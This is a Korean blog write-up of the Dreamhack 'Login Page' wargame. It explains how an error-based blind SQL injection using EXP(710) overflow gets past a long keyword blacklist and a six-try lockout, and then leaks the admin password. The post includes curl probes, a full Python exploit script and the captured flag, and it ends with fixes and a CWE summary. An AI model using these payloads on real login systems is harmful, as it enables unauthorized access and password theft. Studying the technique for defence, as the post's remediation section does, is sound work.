---
layout: post
title:  "Dreamhack 워게임 Login Page 풀이 — 빡센 SQL 키워드 블랙리스트와 6회 제한을 우회한 error-based blind SQLi"
date:   2026-05-20 10:30:00 +0900
categories: security web wargame dreamhack writeup sqli blind-sqli mysql error-based
---

## 들어가며

Dreamhack 웹해킹 워게임 **Login Page** (난이도 별 2, 풀이자 370명) 풀이입니다. SQL injection 인데 출제자가 거의 100% 의 흔한 SQLi 키워드/문자를 블랙리스트로 막아두고, 그 위에 **이중 정답 검증 + 6회 실패 시 비밀번호 자동 리셋** 까지 얹은 빡빡한 문제. 결국 **`EXP(710)` 오버플로 에러를 boolean oracle 로 쓰는 error-based blind SQLi** 가 정답입니다.

문제 설명:

> Python으로 작성된 로그인 페이지입니다.
> admin으로 로그인하여 플래그를 획득하세요.

스포일러 결론(요약 페이로드):

```
username: admin' AND EXP(IF(ASCII(MID(password,N,1)) BETWEEN low AND high,710,0))=999#
password: a
```

- 조건 TRUE → `EXP(710)` 가 DOUBLE 오버플로 → MySQL 에러 → Flask 500
- 조건 FALSE → `EXP(0)=1`, `1=999` → false → 행 미반환 → 200 (단순 실패 메시지)

각 문자에 대해 위 boolean oracle 을 binary search 로 7번 정도 던지면 32자 password 가 통째로 leak.
세션은 매 요청마다 새로 발급해 6회 제한 카운터를 피한다.

획득한 플래그: **`DH{27c62778eea924e049fa9e83d1e6adb0}`**.

## 1. 자료 파악

ZIP 안 구조:

```
deploy/app/
├── app.py
├── init.sql            (admin 한 명만 users 테이블에 있음)
├── flag
├── run.sh              (export MYSQL_USER/PASSWORD; mysqld_safe; python3 app.py)
├── requirements.txt
├── static/images/logo.png
└── templates/{index,login}.html
```

`app.py` 의 핵심 두 가지:

### 1.1 SQL 블랙리스트

```python
SQL_BAN_LIST = [
    'update', 'extract', 'lpad', 'rpad', 'insert', 'values', '~', ':', '+',
    'union', 'end', 'schema', 'table', 'drop', 'delete', 'sleep', 'substring',
    'database', 'declare', 'count', 'exists', 'collate', 'like', '!', '"',
    '$', '%', '&', '+', '.', ':', '<', '>', 'delay', 'wait', 'order', 'alter'
]

def check_query_ban_list(query):
    for banned in SQL_BAN_LIST:
        if banned in query.lower():
            return False
    return True
```

`username` 과 `password` 입력에 대해 lower() 후 substring 매칭으로 차단. 흔한 SQLi 무기들이 거의 다 막힘:

- `UNION` ❌ → 컬럼 통제 불가
- `SLEEP/WAIT/DELAY` ❌ → time-based blind 불가
- `LIKE/SUBSTRING/EXTRACT/COUNT/EXISTS` ❌ → 정규 oracle 도구 다수 차단
- `<`, `>`, `!`, `&`, `%` ❌ → 비교/비트 연산 거의 다 불가
- `ORDER` ❌ → ORDER BY 정렬 기반 무력화

### 1.2 이중 검증 + 자동 리셋

```python
ret = cursor.fetchone()
if not ret:
    session['tries'] += 1
    if session['tries'] >= MAX_LOGIN_TRIES:   # MAX=6
        reset_password()
    ...
    return render_template('login.html', msg=...)

# 행이 반환된 경우 — 추가 검증
actual_username = ret[1]
actual_password = ret[2]
if username != actual_username or password != actual_password:
    reset_password()    # ← 한 번이라도 정답이 안 맞으면 비번 리셋
    ...
```

즉 `' OR 1=1 #` 같은 흔한 인증 우회를 시도하면 — admin row 가 반환되지만 — username/password 비교에서 실패해 **비밀번호가 즉시 리셋**됩니다. `reset_password()` 는 `base64(base64(urandom(16)))` 으로 32자 무작위 password 를 새로 만들기 때문에 다시는 못 맞춤.

→ **"행을 반환하게 만드는 페이로드"** 자체가 함정. 행을 반환하지 않고 정보만 흘리는 채널이 필요.

## 2. 가설 — 무엇이 가능한가

블랙리스트를 한 줄 한 줄 살펴보며 무기를 추리면:

| 무기 | 사용 가능 | 비고 |
|---|---|---|
| `UNION SELECT` | ❌ | union 금지 |
| `SLEEP/BENCHMARK` | ❌ | sleep/wait/delay 금지 |
| `LIKE`, `SUBSTRING` | ❌ | 금지 |
| `MID()`, `LEFT()` | ✅ | 금지어 없음 |
| `IF()`, `BETWEEN ... AND ...` | ✅ | between, if, and 모두 허용 |
| `ASCII()`, `ORD()` | ✅ | 금지어 없음 |
| `EXP()`, `POW()`, `LOG()` | ✅ | 수학 함수 통과 |
| `=`, `BETWEEN` | ✅ | 비교 가능 (단 `<>=`>` 등은 불가) |
| `#` 주석 | ✅ | 금지어 아님 |

오라클로 쓸 후보:

1. **timing**: `SLEEP` 금지 → 우회 어려움.
2. **error**: 수학 함수가 살아 있으니 `EXP(>709)` 로 overflow 에러 가능 — 강력한 후보.
3. **boolean (행 반환 차이)**: 행 반환 시 자동 리셋 → 사용 불가.

`EXP` overflow 가 가장 깔끔한 1차 후보. 실제 동작 확인이 먼저.

## 3. 사이드 채널 확인

서버 부팅 후 한 줄 한 줄 실험:

```bash
# (a) 정상 실패 — 200, "tries 5 remaining"
curl -X POST $S/login -d "username=admin&password=wrong"
# → 200, "Password will be reset after 5 unsuccessful login attempts."

# (b) EXP(710) — 500
curl -X POST $S/login -d "username=admin' AND EXP(710)#&password=a"
# → 500 Internal Server Error

# (c) EXP(0)=999 — 200 (행 없음, tries++)
curl -X POST $S/login -d "username=admin' AND EXP(0)=999#&password=a"
# → 200, "Password will be reset after 4 unsuccessful login attempts."
```

세 가지 사실 확인:

1. `EXP(710)` 가 정말로 ERROR 1690 (DOUBLE out of range) 을 던지고, Flask 가 500 으로 응답함. **TRUE 분기 = 500**.
2. `EXP(0)=999` 처럼 FALSE 분기는 단순 산술 비교 → 행 미반환 → 일반 실패 → **tries++ 이지만 reset 안 됨**.
3. 500 응답은 try/except 밖이라 `tries++` 도 안 일어남 — 즉 **TRUE 응답은 카운터에 전혀 영향이 없음**.

## 4. 오라클 페이로드 설계

원하는 모양:

```sql
SELECT * FROM users
WHERE username = 'admin'
  AND EXP(IF(<predicate>, 710, 0)) = 999
  -- (이후 password='a' 는 주석)
```

- `<predicate>` TRUE → `EXP(710)` 던짐 → 500
- `<predicate>` FALSE → `EXP(0)=1`, `1=999` → false → 행 없음 → 200

`<predicate>` 자리에 `ASCII(MID(password, N, 1)) BETWEEN low AND high` 를 넣으면 N 번째 문자의 ASCII 가 [low, high] 구간 안에 있는지 검사. binary search 로 보통 1문자당 ~7번이면 정확한 값 결정.

페이로드 (username 필드):

```
admin' AND EXP(IF(ASCII(MID(password,N,1)) BETWEEN LO AND HI,710,0))=999#
```

블랙리스트 마지막 점검:

- `admin`, `AND`, `EXP`, `IF`, `ASCII`, `MID`, `password`, `BETWEEN`, `#`, 숫자, `(`, `)`, `,` — 모두 금지어/금지문자 없음 ✓
- `between` 이 `end` 를 포함하지 않는지 — `b-e-t-w-e-e-n`, "end" 연속 부분 없음 ✓
- `password` 가 어떤 금지어와 겹치지 않는지 — 없음 ✓

## 5. 6회 카운터 우회

`session['tries']` 는 Flask 의 서명 쿠키 안에 저장. 세션 쿠키 자체를 매 요청마다 새로 받으면 `tries=0` 으로 리셋됨. 단 매 요청 첫 번째로 `POST /` 를 호출해 새 세션을 발급받아야 함.

```python
def new_session():
    s = requests.Session()
    s.post(SERVER + "/", allow_redirects=False)
    return s
```

쿼리 한 번에 fresh session 한 개. 6회 제한이 사실상 무력화됨.

## 6. 익스플로잇 — 전체 스크립트

```python
import requests

SERVER = "http://host3.dreamhack.games:PORT"

def new_session():
    s = requests.Session()
    s.post(SERVER + "/", allow_redirects=False, timeout=10)
    return s

def oracle(N, lo, hi):
    s = new_session()
    payload_user = (
        f"admin' AND EXP(IF(ASCII(MID(password,{N},1)) "
        f"BETWEEN {lo} AND {hi},710,0))=999#"
    )
    r = s.post(
        SERVER + "/login",
        data={"username": payload_user, "password": "a"},
        allow_redirects=False, timeout=10,
    )
    return r.status_code == 500  # 500 = TRUE branch

def leak_char(N, lo=33, hi=126):
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(N, lo, mid):
            hi = mid
        else:
            lo = mid + 1
    return chr(lo)

password = "".join(leak_char(N) for N in range(1, 33))
print("password:", password)

# 진짜 로그인
s = new_session()
r = s.post(SERVER + "/login", data={"username": "admin", "password": password})
print(r.text)
# → <p id="msg">DH{27c62778eea924e049fa9e83d1e6adb0}</p>
```

실행 시간: 32자 × 평균 7회 binary search = 224회 쿼리 × ~0.4s = **약 1분 30초**.

## 7. 안전하게 고치기

### 7.1 Parameterized query (1순위)

```python
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password),
)
```

pymysql 의 `%s` placeholder 는 자동 escape. **단 하나로 이 문제의 모든 SQLi 가 사라짐**. 블랙리스트 자체가 필요 없어짐.

### 7.2 블랙리스트 ≠ 보안

이번 문제처럼 50개 가까운 키워드/문자를 막아도 `EXP(710)` 한 가지가 살아 있어서 뚫림. **사용자 입력은 데이터로 다루고, 코드와 섞지 말라** 는 단순 원칙 한 줄이 100줄 블랙리스트를 이긴다.

### 7.3 오류 메시지/스택트레이스 노출 차단

500 자체가 oracle 이었음. 실서비스라면 모든 unhandled exception 을 동일한 generic 200/500 응답으로 wrap 해서 side-channel 화 가능성을 줄여야 함. 보통은 Flask 의 `@app.errorhandler(Exception)` 으로 일관된 응답을 보냄.

### 7.4 비밀번호 비교는 항상 상수시간

`if username != actual_username or password != actual_password:` 는 Python 의 `!=` 가 짧은 차이에서 빨리 끝나므로 timing 누출 가능성. `hmac.compare_digest` 로 비교.

### 7.5 자동 패스워드 리셋이 진짜 의도라면

자동 리셋은 보안 강화처럼 보이지만 **합법 사용자의 DoS 도구** 가 됩니다. 같은 사용자에 대해 무한히 시도 → 무한히 리셋 → 사용자 영구 잠금. CAPTCHA + rate limit 조합이 일반적인 정공법.

## 8. 한 번 더 정리

### 8.1 취약점 카탈로그

| 단계 | 카테고리 | 원인 |
|---|---|---|
| 사용자 입력을 쿼리에 format() | SQL Injection (CWE-89) | 파라미터화 미사용 |
| 키워드 블랙리스트 | Reliance on Untrusted Inputs in Security Decision (CWE-807) | 블랙리스트로 인젝션 차단 시도 |
| 500 응답 = side channel | Information Exposure Through Error Message (CWE-209) | 예외 응답 일관성 부족 |
| reset_password() 자동 | DoS / Account Lockout 악용 | 합법 사용자 잠금 가능 |

### 8.2 입문자가 챙겨가면 좋은 시각

- **금지어 블랙리스트는 거의 항상 뚫린다**. 같은 의미의 다른 함수, 같은 효과의 다른 연산자, 인코딩, 공백 변형 등 우회 경로가 너무 많음.
- **SQLi 의 무기는 키워드 그 자체가 아니라 "표현식을 끼워넣을 수 있다" 라는 능력**. `EXP/POW/LOG/CAST` 같은 평범한 수학 함수도 boolean oracle 이 됨.
- **반대로 oracle 만 있으면 거의 모든 데이터는 leak 가능**. 32자 password 도 1분 안에 다 뽑힌다.
- **모든 unhandled exception 은 잠재적 oracle**. 5xx 와 4xx 의 구분, 다른 에러 페이지의 길이 차이 같은 미세 차이도 사이드채널로 변신 가능.

## 9. 시도했지만 실패한 것들 (회고)

이번엔 풀이 자체는 깔끔했지만 가설 정리에 시간이 좀 듦.

### 9.1 첫 가설 — Boolean blind (행 반환 차이)

처음엔 자연스럽게 "`' OR 1=1 #` 같은 행 반환 oracle 어떻게 쓸까?" 부터 떠올렸음. 하지만 곧 `reset_password()` 분기를 보고 **행이 반환되는 모든 경로가 비번 리셋을 유발**한다는 점을 인식. 즉시 다른 oracle 로 전환.

**회고**: "행 반환 = 성공" 이 자명한 SQLi 의 첫 시도지만, **이중 검증** 과 **자동 패스워드 리셋** 같은 비정형 가드가 보이면 그 가정부터 깨야 함. **방어 로직을 정확히 읽지 않고 oracle 을 설계하면 0회로 게임 오버**.

### 9.2 두 번째 가설 — `<<`, `&` 비트 연산으로 ASCII 비트 leak

`ASCII(MID(...)) & 64 = 64` 같은 비트 leak 이 가장 흔한 패턴이지만 `&` 가 banlist 에 있어서 막힘. `<<` 도 `<` 가 banlist. 결국 `BETWEEN ... AND ...` 로 binary search.

**회고**: 블랙리스트는 단순 문자열 substring 체크라 우회 가능성이 높지만, **연산자 자체가 막히면 같은 의미의 함수형 표현** (`MOD`, `DIV`, `BIN_TO_NUM`, `BETWEEN` 등) 으로 우회 가능. 한 가지 무기가 막혔다고 절망하지 말고 동의어 사전을 머릿속에 펼치자.

### 9.3 세 번째 가설 — `EXP(710)` 가 정말 throw 하는가

MySQL 의 sql_mode 가 strict 가 아닌 경우 numeric overflow 는 WARNING 으로 끝나고 NULL 을 반환. 처음엔 "혹시 warning 만 발생하고 200 OK 가 나면 oracle 이 안 되는데?" 우려가 있었음. 실서버에 직접 던져봐서 **MariaDB 가 default 로 strict 모드** 라 ERROR 1690 발생하는 걸 확인 → 즉시 본격 스크립트로 직행.

**회고**: "이 함수가 진짜 에러를 던질까?" 는 **DB 버전 + sql_mode** 에 매우 민감하므로, 가설을 검증하는 한 줄짜리 페이로드를 가장 먼저 던지고 확인. 페이로드 30개짜리 스크립트를 작성하기 전에 확실히 짚고 시작하는 게 정공법.

---

블랙리스트는 50개를 막아도 1개 빈틈이 있으면 무너집니다. 파라미터화 쿼리 한 줄로 끝.
